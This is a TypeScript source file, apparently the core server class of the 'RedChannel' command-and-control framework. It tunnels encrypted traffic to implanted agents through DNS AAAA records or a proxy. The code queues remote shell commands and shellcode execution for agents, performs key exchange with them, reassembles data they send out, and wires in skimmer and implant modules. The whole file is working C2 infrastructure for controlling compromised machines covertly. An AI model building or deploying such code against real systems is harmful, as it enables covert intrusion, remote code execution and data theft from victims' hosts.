import * as crypto from "crypto";
import * as path from "path";
import ECKey from "ec-key";
import merge from "lodash.merge";

import { Config, Constants, emsg } from "../utils/utils";
import Crypto, { CipherModel, KeyExportType } from "./crypto";
import Logger from "./logger";
import SkimmerModule from "../modules/skimmer";
import StaticDnsModule from "../modules/static_dns";
import ImplantModule from "../modules/implant";
import AgentModule from "../modules/agent";
import ProxyModule from "../modules/proxy";
import C2Module from "../modules/c2";

export enum AgentCommand {
    AGENT_SYSINFO = 0x01,
    AGENT_CHECKIN = 0x02,
    AGENT_SHELL = 0x03,
    AGENT_MSG = 0x04,
    AGENT_EXEC_SC = 0x05,
    AGENT_SHUTDOWN = 0x06,
    AGENT_KEYX = 0x07,
    AGENT_SET_CONFIG = 0x08,
    AGENT_IGNORE = 0xff,
}

// to clarify the Map()s
export type DataId = string;
export type DataChunk = string;
export type SendQ = SendQItem[];
export type SendQItem = string[];
export type AgentId = string;
export type AgentIdRandId = string;

export interface AgentModel {
    id: string;
    secret: Buffer;
    keyx?: ECKey;
    lastseen?: number;
    ip?: string;
    channel?: AgentChannel;
    allowKeyx?: boolean;
    sendq: SendQ;
    // each agent command has a map of dataId => chunks[]
    recvq: Map<AgentCommand, Map<DataId, DataChunk[]>>;
}

// agent status hex string value to be appended to DNS response
export enum AgentStatus {
    MORE_DATA = "01",
    DATA_RECEIVED = "02",
    NO_DATA = "03",
    ERROR_IMPORTING_KEY = "04",
    ERROR_DERIVING_SECRET = "05",
    ERROR_DECRYPTING_MESSAGE = "06",
    ERROR_GENERATING_KEYS = "07",
    ERROR_INVALID_MESSAGE = "08",
    ERROR_AGENT_UNKNOWN = "09",
    ERROR_FAILED = "0f",
}

export enum AgentChannel {
    DNS = "dns",
    PROXY = "proxy",
}

export default class RedChannel {
    version = Constants.VERSION;

    agents: Map<AgentId, AgentModel>;
    flood: Map<AgentIdRandId, NodeJS.Timeout>;

    /**
     * available commands for 'help' to display
     *
     * agent commands are available while interacting with an agent
     * c2 commands are available in the main menu
     */
    commands: any;

    /**
     * module actions
     *
     * function will be executed when the command is typed
     */
    modules: any;

    hashedPassword: string;
    plaintextPassword: string;

    configFile: string;

    // the absolute path to the app directory
    appRoot: string = path.resolve("./");

    log: Logger;

    crypto: Crypto;

    constructor(debug: boolean, domain: string, password: string, cliConfig: any, configFile?: string) {
        this.log = new Logger();

        this.agents = new Map<AgentId, AgentModel>();

        this.configFile = configFile ?? Config.DEFAULT_CONFIG_FILE;

        this.modules = {
            c2: new C2Module(domain, debug, this.configFile),
            agent: new AgentModule(this.configFile),
            skimmer: new SkimmerModule(this.configFile),
            static_dns: new StaticDnsModule(this.configFile),
            proxy: new ProxyModule(
                this.configFile,
                this,
                this.c2MessageHandler.bind(this),
                (result) => {
                    this.log.debug(result.message);
                },
                (error) => {
                    this.log.error(error.message);
                }
            ),
            implant: new ImplantModule(this.configFile, this),
        };

        this.modules.c2.config = merge(this.modules.c2.config, cliConfig);

        if (!this.modules.c2.config.domain) {
            throw new Error(`Please specify the c2 domain via cli or config file, see '--help'`);
        }

        this.plaintextPassword = password;
        this.hashedPassword = crypto.createHash("md5").update(password).digest("hex");

        this.appRoot = __dirname;

        this.crypto = new Crypto();

        this.flood = new Map<AgentId, NodeJS.Timeout>();

        if (this.modules.proxy.config.enabled) this.modules.proxy.proxyFetchLoop();
    }

    initAgent(agentId, channel: AgentChannel) {
        if (!this.agents.has(agentId)) {
            this.agents.set(agentId, {
                id: agentId,
                secret: Buffer.from(""),
                lastseen: 0,
                channel: channel,
                allowKeyx: false,
                sendq: [],
                recvq: new Map<AgentCommand, Map<DataId, DataChunk[]>>(),
            });
        }
    }

    killAgent(agentId) {
        this.agents.delete(agentId);
    }

    broadcastKeyx() {
        this.sendCommandKeyx();
    }

    /**
     * Send keyx to an agent, broadcast it to all
     * @param agentId if null, we will broadcast keyx to all agents
     * @returns
     */
    sendCommandKeyx(agentId?: string) {
        if (!this.crypto.privateKey) {
            try {
                this.crypto.generateKeys();
            } catch (ex) {
                this.log.error(`failed to generate keys: ${emsg(ex)}`);
                return;
            }
        }

        const uncompressedPublicKey = this.crypto.exportPublicKey(KeyExportType.UNCOMPRESSED);
        if (!agentId) {
            // broadcast keyx if no agent is specified
            for (const id of this.agents.keys()) {
                this.queueData(id, AgentCommand.AGENT_KEYX, uncompressedPublicKey);
            }
            this.log.info(`broadcasting keyx`);
            return;
        }

        if (this.agents.has(agentId)) {
            this.queueData(agentId, AgentCommand.AGENT_KEYX, uncompressedPublicKey);
        } else {
            this.log.error(`agent ${agentId} does not exist`);
        }
        return;
    }

    sendCommandShutdown(agentId: string) {
        const secret = this.getAgent(agentId)?.secret;
        if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);

        this.queueData(agentId, AgentCommand.AGENT_SHUTDOWN, this.encryptPayload(crypto.randomBytes(6).toString("hex"), secret));
    }

    sendCommandShell(agentId: string, shellCommand: string) {
        this.queueData(agentId, AgentCommand.AGENT_SHELL, shellCommand);
    }

    sendCommandExecShellcode(agentId: string, shellcode) {
        this.queueData(agentId, AgentCommand.AGENT_EXEC_SC, shellcode);
    }

    // agent must be able to decrypt the tag to execute shutdown
    sendCommandSysinfo(agentId: string) {
        const secret = this.getAgent(agentId)?.secret;
        if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);

        this.queueData(agentId, AgentCommand.AGENT_SYSINFO, this.encryptPayload(crypto.randomBytes(6).toString("hex"), secret));
    }

    sendCommandSetConfig(agentId: string, config: string) {
        this.queueData(agentId, AgentCommand.AGENT_SET_CONFIG, config);
    }

    /**
     * queue up data to send when agent checks in next
     * 2001:[record_num]:[4 byte data]:...
     *
     * first IP in each command must be the data identifier for agent to track
     * ff00:[data_id]:[command][padded_bytes_count]:[total_records]:[4 byte reserved data]:...
     *
     */
    queueData(agentId: string, command: AgentCommand, data: string) {
        const agent = this.agents.get(agentId);
        if (!agent) throw new Error(`agent ${agentId} not found`);

        let dataPayload = this.encryptPayload(data, agent.secret);
        if (dataPayload.length == 0) dataPayload = crypto.randomBytes(2).toString("hex");

        const dataBlocks = dataPayload.match(/[a-f0-9]{1,4}/g);
        if (!dataBlocks) return;

        // prettier-ignore
        const totalRecords =
            Math.floor(dataBlocks.length / Config.MAX_DATA_BLOCKS_PER_IP) +
            (dataBlocks.length % Config.MAX_DATA_BLOCKS_PER_IP == 0 ? 0 : 1);

        // prettier-ignore
        const totalCommands =
            Math.floor(totalRecords / Config.MAX_RECORDS_PER_COMMAND) +
            (totalRecords % Config.MAX_RECORDS_PER_COMMAND == 0 ? 0 : 1);

        const dataId = crypto.randomBytes(2).toString("hex");

        let records: string[] = [];
        let paddedBytes = 0;
        let record = "";
        for (let recordNum = 0; recordNum < totalRecords; recordNum++) {
            const blocksPerIp = dataBlocks.splice(0, Config.MAX_DATA_BLOCKS_PER_IP);

            // pad the last block with trailing Fs
            const lastAddedBlock = blocksPerIp.slice(-1)[0];
            paddedBytes = 4 - lastAddedBlock.length;
            blocksPerIp[blocksPerIp.length - 1] = this.padTail(lastAddedBlock, 4);
            if (blocksPerIp.length < Config.MAX_DATA_BLOCKS_PER_IP) {
                const blocksNeeded = Config.MAX_DATA_BLOCKS_PER_IP - blocksPerIp.length;
                for (let j = 0; j < blocksNeeded; j++) {
                    blocksPerIp.push(Config.DATA_PAD_CHAR.repeat(4));
                    paddedBytes += 4;
                }
            }
            if (paddedBytes > 0) {
                paddedBytes = paddedBytes / 2; // agent assumes bytes not hex strings
            }

            // prettier-ignore
            record =
            Config.RECORD_DATA_PREFIX +
                ":" +
                this.padZero(recordNum.toString(16), 4) +
                ":" +
                blocksPerIp.join(":");
            records.push(record);

            if (totalCommands > 1 && (records.length == Config.MAX_RECORDS_PER_COMMAND - 1 || recordNum == totalRecords - 1)) {
                // prettier-ignore
                record =
                Config.RECORD_HEADER_PREFIX +
                    ":" +
                    dataId +
                    ":" +
                    this.padZero(command.toString(16), 2) +
                    this.padZero(paddedBytes.toString(16), 2) +
                    ":" +
                    this.padZero(totalRecords.toString(16), 4) +
                    ":" +
                    "0000:0000:0000:0001";

                records.unshift(record);

                agent.sendq.push(records);
                records = [];
            }
        }
        if (totalCommands == 1) {
            // prettier-ignore
            record =
            Config.RECORD_HEADER_PREFIX +
                ":" +
                dataId +
                ":" +
                this.padZero(command.toString(16), 2) +
                this.padZero(paddedBytes.toString(16), 2) +
                ":" +
                this.padZero(totalRecords.toString(16), 4) +
                ":" +
                "0000:0000:0000:0001";
            records.unshift(record);
        }

        // set to false after keyx is received and there are no more keyx in sendq
        if (command == AgentCommand.AGENT_KEYX) agent.allowKeyx = true;

        if (records.length > 0) {
            agent.sendq?.push(records);
            if (this.modules.proxy.config.enabled && agent.channel == AgentChannel.PROXY) {
                this.modules.proxy.sendToProxy(agent.id, records);

                // cleanup sendq if proxying to agent
                agent.sendq = [];
            }
        }
        //console.log("* queued up " + total_records + " records in " + total_commands + " command(s) for agent: " + agent_id);
        //console.log("`- records: " + JSON.stringify(records));
    }

    padZero(proxyData, max_len) {
        return "0".repeat(max_len - proxyData.length) + proxyData;
    }
    padTail(proxyData, max_len) {
        return proxyData + Config.DATA_PAD_CHAR.repeat(max_len - proxyData.length);
    }

    isCommandInSendQ(agentId, command) {
        const agent = this.agents.get(agentId);
        if (!agent) {
            this.log.error(`agent ${agentId} not found`);
            return;
        }

        const findCommand = this.padZero(command.toString(16), 2);
        let is = false;
        agent.sendq?.forEach((queue) => {
            if (queue[0].substring(0, 4) == Config.RECORD_HEADER_PREFIX) {
                if (queue[0].substring(12, 14) == findCommand) {
                    is = true;
                    return;
                }
            }
        });
        return is;
    }

    makeIpString(last_byte) {
        return `${Config.RECORD_HEADER_PREFIX}:0000:${AgentCommand.AGENT_IGNORE.toString(16)}01:0000:0000:dead:c0de:00${last_byte}`;
    }

    /**
     * Make a string the cipher data and iv
     * @param {CipherModel} cipher A cipher object with IV and Data
     * @returns a hex string
     */
    makeEncryptedBufferStringHex(cipher: CipherModel) {
        return Buffer.concat([cipher.iv, cipher.data]).toString("hex");
    }

    countDataChunks(chunks_array: string[]) {
        return chunks_array.filter((a) => a !== undefined).length;
    }

    getAllAgents() {
        return this.agents.keys();
    }

    getAgent(agentId): AgentModel | null {
        return this.agents.get(agentId) || null;
    }

    /**
     req: {
         connection: {
             remoteAddress: '127.0.0.1',
            type: 'AAAA'
        }
    }
    res: {
        question[0]: {
            type: 'AAAA',
            name: 'dns.query.tld'
        },
        answer: [],
        end: function(){}
    }
    */
    c2MessageHandler(req, res) {
        var question = res.question[0];
        var hostname = question.name as string;
        var ttl = 300; // Math.floor(Math.random() 3600)
        let channel = question.type === "PROXY" ? AgentChannel.PROXY : AgentChannel.DNS;

        if (this.modules.static_dns.config[hostname]) {
            this.log.info(`static_dns: responding to request for host: '${hostname}' with ip '${this.modules.static_dns.config[hostname]}'`);
            res.answer.push({
                name: hostname,
                type: "A",
                data: this.modules.static_dns.config[hostname],
                ttl: ttl,
            });
            return res.end();
        }

        if (!hostname.endsWith(this.modules.c2.config.domain)) {
            this.log.debug(`unknown c2 domain, ignoring query for: ${hostname}`);
            return res.end();
        }
        this.log.debug(`query: ${req.connection.remoteAddress}:${req.connection.type} ${question.type} ${question.name}`);

        if (question.type !== "AAAA" && question.type !== "PROXY") {
            this.log.debug(`ignoring non-AAAA/non-PROXY query ${req.connection.remoteAddress}:${req.connection.type} ${question.type} ${question.name}`);
            return res.end();
        }

        const segments = hostname.slice(0, hostname.length - this.modules.c2.config.domain.length).split(".");
        if (segments.length < Config.EXPECTED_DATA_SEGMENTS) {
            this.log.error(`invalid message, not enough data segments (${segments.length}, expected ${Config.EXPECTED_DATA_SEGMENTS}): ${hostname}`);

            return res.end();
        }

        // used to prevent flooding
        const randId: string = segments[0];
        const agentId: string = segments[1];

        const floodId = agentId + randId;

        if (!this.agents.has(agentId)) {
            this.initAgent(agentId, channel);
            this.log.warn(`first ping from agent ${agentId}, src: ${req.connection.remoteAddress}, channel: ${channel}`);

            this.log.warn(`keyx started with agent ${agentId}`);
            this.sendCommandKeyx(agentId);
        }
        const agent = this.agents.get(agentId)!;

        agent.lastseen = Math.floor(Date.now() / 1000);
        agent.ip = req.connection.remoteAddress;

        let command = 0;
        try {
            command = parseInt(segments[2].slice(0, 2), 16);
        } catch (ex) {
            this.log.error(`failed to parse command: ${emsg(ex)}`);

            return res.end();
        }

        // no need to check the incoming data, just send a queued up msg
        if (command == AgentCommand.AGENT_CHECKIN) {
            if (channel !== agent.channel) {
                this.log.warn(`agent ${agentId} switching channel from ${agent.channel} to ${channel}`);
                agent.channel = channel;
            }

            if (agent.sendq?.length == 0) {
                // 03 means no data to send
                this.log.debug(`agent ${agentId} checking in, no data to send`);
                const noDataStatus = this.makeIpString(AgentStatus.NO_DATA);
                res.answer.push({
                    name: hostname,
                    type: "AAAA",
                    data: noDataStatus,
                    ttl: ttl,
                });

                return res.end();
            }

            // we have already responded to this agent and rand_id combination
            // reset the flood protection timeout
            if (this.flood.has(floodId)) {
                clearTimeout(this.flood[floodId]);
                this.flood.set(
                    floodId,
                    setTimeout(() => {
                        this.flood.delete(floodId);
                    }, Config.FLOOD_PROTECTION_TIMEOUT_MS)
                );

                this.log.warn(`ignoring flood from agent: ${agentId}, rid: ${randId}, command: ${command}`);
                return res.end();
            }

            this.log.debug(`agent ${agentId} checking in, sending next queued command`);
            const records = agent.sendq.shift();
            if (records) {
                records.forEach((record) => {
                    res.answer.push({
                        name: hostname,
                        type: "AAAA",
                        data: record,
                        ttl: ttl,
                    });
                });
            }

            // flood protection, if the agent dns resolver retries a query, data can be lost
            // so we ignore retries
            this.flood.set(
                floodId,
                setTimeout(() => {
                    this.flood.delete(floodId);
                }, Config.FLOOD_PROTECTION_TIMEOUT_MS)
            );

            return res.end();
        }

        let chunkNumber = 0;
        let totalChunks = 0;
        try {
            chunkNumber = parseInt(segments[2].slice(2, 4), 16);
            totalChunks = parseInt(segments[2].slice(4, 6), 16);
        } catch (ex) {
            this.log.error(`message: invalid chunk numbers, current: ${chunkNumber}, total: ${totalChunks}`);
            return res.end();
        }

        if (chunkNumber > totalChunks - 1) {
            this.log.error(`message: invalid chunk number (out of bounds), current: ${chunkNumber}, total: ${totalChunks}`);
            return res.end();
        }

        const dataId: string = segments[3];
        if (dataId.length < 2) {
            this.log.error(`message: invalid data id: ${dataId}`);
            return res.end();
        }

        const chunk: string = segments[4];
        if (chunk.length < 2) {
            this.log.error(`message: invalid chunk: ${chunk}`);
            return res.end();
        }

        if (!agent.recvq.has(command)) {
            agent.recvq.set(command, new Map<DataId, DataChunk[]>());
        }

        // we use ! to tell typescript we are smarter than it
        const recvqCommand = agent.recvq.get(command)!;
        if (!recvqCommand.get(dataId)) {
            recvqCommand.set(dataId, new Array(totalChunks));
        }

        const recvqDataId = recvqCommand.get(dataId)!;

        recvqDataId[chunkNumber] = chunk;

        // count all data array entries, excluding undefined
        // since data is not sent in sequence, array may be [undefined, undefined, 123, undefined, 321]
        if (this.countDataChunks(recvqDataId) == totalChunks) {
            const dataChunks = recvqDataId.join("");
            recvqCommand.delete(dataId);

            // process data, send back status (0f = failed, 02 = success)
            const processStatus = this.processAgentData(agentId, command, dataChunks);
            if (processStatus) {
                res.answer.push({
                    name: hostname,
                    type: "AAAA",
                    data: this.makeIpString(processStatus),
                    ttl: ttl,
                });
            }

            return res.end();
        }

        // last byte 01 indicates more data is expected
        const moreData = this.makeIpString("01");
        res.answer.push({
            name: hostname,
            type: "AAAA",
            data: moreData,
            ttl: ttl,
        });

        /*if (question.type == 'CNAME') {
        res.answer.push({ name: hostname, type: 'CNAME', data: "x.domain.tld", 'ttl': ttl })
        }
        if (question.type == 'A') {
            res.answer.push({ name: hostname, type: 'A', data: "1.1.1." + length, 'ttl': ttl })
        }*/
        return res.end();
    }

    processAgentData(agentId, command, data): AgentStatus {
        const agent = this.agents.get(agentId);
        if (!agent) {
            this.log.error(`agent ${agentId} not found`);
            return AgentStatus.ERROR_AGENT_UNKNOWN;
        }

        let plaintext = "";
        switch (command) {
            case AgentCommand.AGENT_KEYX:
                if (!agent.allowKeyx) {
                    this.log.error(`incoming keyx from ${agentId} not allowed, initiate keyx first`);
                    break;
                }

                if (!this.crypto.privateKey) {
                    try {
                        this.crypto.generateKeys();
                    } catch (ex) {
                        this.log.error(`failed to generate keys: ${emsg(ex)}`);
                        return AgentStatus.ERROR_GENERATING_KEYS;
                    }
                }

                try {
                    const agentPubkey = Buffer.from(data, "hex");
                    agent.keyx = this.crypto.importUncompressedPublicKey(agentPubkey);
                } catch (ex) {
                    this.log.error(`cannot import key for ${agentId}: ${emsg(ex)}`);
                    return AgentStatus.ERROR_IMPORTING_KEY;
                }
                this.log.success(`agent(${agentId}) keyx: ${agent.keyx.asPublicECKey().toString("spki")}`);

                try {
                    agent.secret = this.crypto.deriveSecret(agent.keyx, this.hashedPassword);
                } catch (ex) {
                    this.log.error(`cannot derive secret for ${agentId}: ${emsg(ex)}`);
                    return AgentStatus.ERROR_DERIVING_SECRET;
                }
                this.log.success(`agent(${agentId}) secret: ${agent.secret?.toString("hex")}`);

                // if there are no more queued up keyx's, ignore further keyxs from agent
                if (!this.isCommandInSendQ(agentId, AgentCommand.AGENT_KEYX)) agent.allowKeyx = false;
                break;
            case AgentCommand.AGENT_MSG:
                try {
                    plaintext = this.decryptAgentData(agentId, data);
                } catch (ex) {
                    this.log.error(`cannot decrypt message from ${agentId}: ${emsg(ex)}`);
                    return AgentStatus.ERROR_DECRYPTING_MESSAGE;
                }
                this.log.success(`agent(${agentId}) output>\n ${plaintext}`);
                break;
            case AgentCommand.AGENT_SYSINFO:
                try {
                    plaintext = this.decryptAgentData(agentId, data);
                } catch (ex) {
                    this.log.error(`cannot decrypt message from ${agentId}: ${emsg(ex)}`);
                    return AgentStatus.ERROR_DECRYPTING_MESSAGE;
                }

                const sysInfo = plaintext.split(";");
                if (sysInfo.length < 3) {
                    this.log.error(`invalid sysinfo from ${agentId}: ${plaintext}`);
                    return AgentStatus.ERROR_INVALID_MESSAGE;
                }

                const userInfo = sysInfo[2].split(":");
                if (userInfo.length < 3) {
                    this.log.error(`invalid sysinfo:userinfo from ${agentId}: ${plaintext}`);
                    return AgentStatus.ERROR_INVALID_MESSAGE;
                }
                const displayRows = [
                    ["hostname", sysInfo[0]],
                    ["ips", sysInfo[1]],
                    ["user", userInfo[0]],
                    ["uid", userInfo[1]],
                    ["gid", userInfo[2]],
                ];

                this.log.success(`agent(${agentId}) sysinfo>`);
                this.log.displayTable([], displayRows);
                break;
        }
        return AgentStatus.DATA_RECEIVED;
    }

    encryptPayload(data: string, secret: Buffer): string {
        const buffer = Buffer.from(data);
        const cipher = this.crypto.aesEncrypt(buffer, secret);
        const payload = this.makeEncryptedBufferStringHex(cipher);
        return payload;
    }

    decryptAgentData(agentId: string, data: string) {
        const agent = this.agents.get(agentId);
        if (!agent) throw new Error(`agent ${agentId} not found`);
        if (!data) throw new Error("invalid data");
        if (!agent.keyx) throw new Error("missing keyx");
        if (!agent.secret) throw new Error("missing agent secret, do you need to 'keyx'?");

        const dataBuffer = Buffer.from(data, "hex");
        const iv = dataBuffer.slice(0, this.crypto.BLOCK_LENGTH);
        const ciphertext = dataBuffer.slice(this.crypto.BLOCK_LENGTH);

        // may throw errors
        const plaintext = this.crypto.aesDecrypt(ciphertext, agent.secret, iv);
        return plaintext.toString();
    }
}
